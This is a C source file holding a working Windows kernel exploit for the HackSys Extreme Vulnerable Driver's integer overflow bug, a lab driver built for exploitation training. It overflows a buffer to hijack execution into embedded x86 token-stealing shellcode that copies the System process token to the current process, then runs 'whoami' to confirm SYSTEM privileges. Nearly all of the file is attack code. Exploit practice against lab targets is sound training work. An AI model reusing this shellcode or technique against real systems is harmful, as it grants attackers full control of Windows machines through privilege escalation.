#include <Windows.h>
#include <stdio.h>
//offset 2084 + 4 + 4
#define HACKSYS_EVD_INTEGER_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN, 0x809, METHOD_NEITHER, FILE_ANY_ACCESS)

int IntOverflow()
{
    unsigned char shellcode[] = {
        0x60,
        0x64, 0xA1, 0x24, 0x01, 0x00, 0x00,
        0x8B, 0x40, 0x50,
        0x89, 0xC1,
        0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00,
        //---[Копируем токен System PID]
        0xBA, 0x04, 0x00, 0x00, 0x00,
        0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,
        0x2D, 0xB8, 0x00, 0x00, 0x00,
        0x39, 0x90, 0xB4, 0x00, 0x00, 0x00,
        0x75, 0xED,
        0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00,
        0x89, 0x91, 0xF8, 0x00, 0x00, 0x00,
        //---[Восстанавливаем]
        0x61,                               // popad
        0x31, 0xC0,
        0x5D,
        0xC2, 0x08, 0x00                               //ret
    };

    HANDLE device = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
    printf("[+] Open device handle 0x%x\n", device);

    LPVOID exploit = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exploit, shellcode, sizeof(shellcode));

    char* driverBuffer = (char*)VirtualAlloc(0, 2100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    char terminator[] = "\xB0\xB0\xD0\xBA";
    memset(driverBuffer, '\x41', 2084);
    memcpy(&driverBuffer[2084], &exploit, 4);
    memcpy(&driverBuffer[2088], terminator, 4);
    DWORD retn;
    DeviceIoControl(device, HACKSYS_EVD_INTEGER_OVERFLOW, driverBuffer, 0xffffffff, NULL, NULL, &retn, NULL);
    system("whoami");
}
